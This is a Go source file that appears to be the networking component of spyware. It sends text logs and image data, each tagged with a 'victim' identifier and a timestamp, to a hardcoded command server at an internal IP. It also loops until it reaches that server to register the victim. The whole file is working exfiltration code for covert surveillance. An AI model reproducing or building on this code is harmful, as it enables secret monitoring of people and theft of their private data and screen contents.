package network

import (
	"bytes"
	"encoding/json"
	"fmt"
	"main/model"
	"net/http"
	"time"
)

const Url = "http://10.152.2.119:8080"

type ErrorCode int

func SendTextToServer(body, path, victim string) (*http.Response, error) {
	text, err := json.Marshal(model.TextLog{Body: body, Log: model.Log{Date: time.Now(), Victim: victim}})
	if err != nil {
		return nil, err
	}
	resp, err := http.Post(fmt.Sprintf("%s/%s", Url, path), "application/json", bytes.NewBuffer(text))
	if err != nil {
		return nil, err
	}
	return resp, nil
}

func SendImageToServer(body []byte, path, victim string) (*http.Response, error) {
	text, err := json.Marshal(model.ImageLog{Body: body, Log: model.Log{Date: time.Now(), Victim: victim}})
	if err != nil {
		return nil, err
	}
	resp, err := http.Post(fmt.Sprintf("%s/%s", Url, path), "multipart/form-data", bytes.NewBuffer(text))
	if err != nil {
		return nil, err
	}
	return resp, nil
}

func GetResponse(resp *http.Response) (map[string]string, error) {
	var res map[string]string

	err := json.NewDecoder(resp.Body).Decode(&res)
	if err != nil {
		fmt.Println(err)
		return nil, err
	}
	return res, nil
}

func HandleTextRequest(body, path, victim string) (map[string]string, error) {
	resp, err := SendTextToServer(body, path, victim)
	if err != nil {
		return nil, err
	}

	decoded, err := GetResponse(resp)
	if err != nil {
		return nil, err
	}
	return decoded, nil
}

func HandleImageRequest(body []byte, path, victim string) (map[string]string, error) {
	resp, err := SendImageToServer(body, path, victim)
	if err != nil {
		return nil, err
	}

	decoded, err := GetResponse(resp)
	if err != nil {
		return nil, err
	}
	return decoded, nil
}

func EstablishConnection(name string) {
	for {
		_, err := HandleTextRequest("", "owner", name)
		if err != nil {
			fmt.Println(err)
			time.Sleep(3 * time.Second)
		} else {
			break
		}
	}
}
